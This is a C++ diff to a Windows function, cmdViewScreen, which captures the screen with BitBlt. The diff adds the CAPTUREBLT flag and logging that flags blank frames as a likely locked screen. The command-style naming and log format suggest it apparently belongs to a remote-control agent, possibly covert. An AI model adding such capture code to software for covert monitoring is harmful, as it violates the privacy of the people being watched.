@@ -248,10 +248,14 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
 
     HDC memDC = CreateCompatibleDC(screenDC);
     HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, hBmp);
-    BOOL ok = BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
+    BOOL ok = BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY | CAPTUREBLT);
     SelectObject(memDC, oldBmp);
     DeleteDC(memDC);
     ReleaseDC(nullptr, screenDC);
+
+    addLog("[*] ViewScreen: BitBlt=%d, pixels[0]=%02X%02X%02X%02X",
+           (int)ok,
+           pixels[0], pixels[1], pixels[2], pixels[3]);
 
     if (!ok) {
         DeleteObject(hBmp);
@@ -269,6 +273,30 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         wr.str("Error: FromHBITMAP failed");
         out = wr.bytes();
         return;
+    }
+
+    // Check if capture looks blank: sample 9 evenly distributed pixels.
+    // If they are all identical (likely black/uniform), the screen may be
+    // in an idle/non-interactive session and there's nothing to display.
+    {
+        bool uniform = true;
+        uint32_t sampleColor = 0;
+        for (int sy = 0; sy < 3 && uniform; sy++) {
+            for (int sx = 0; sx < 3 && uniform; sx++) {
+                int px = (w / 4) * (sx + 1);
+                int py = (h / 4) * (sy + 1);
+                int idx = py * w + px;
+                uint32_t c = ((uint32_t*)pixels)[idx];
+                if (sy == 0 && sx == 0) sampleColor = c;
+                else if (c != sampleColor) uniform = false;
+            }
+        }
+        if (uniform) {
+            addLog("[!] ViewScreen: captured frame is uniform color (%08X) "
+                   "— likely screen locked / no active session", sampleColor);
+        } else {
+            addLog("[*] ViewScreen: captured frame OK (varied colors)");
+        }
     }
 
     // Create IStream to hold the encoded image
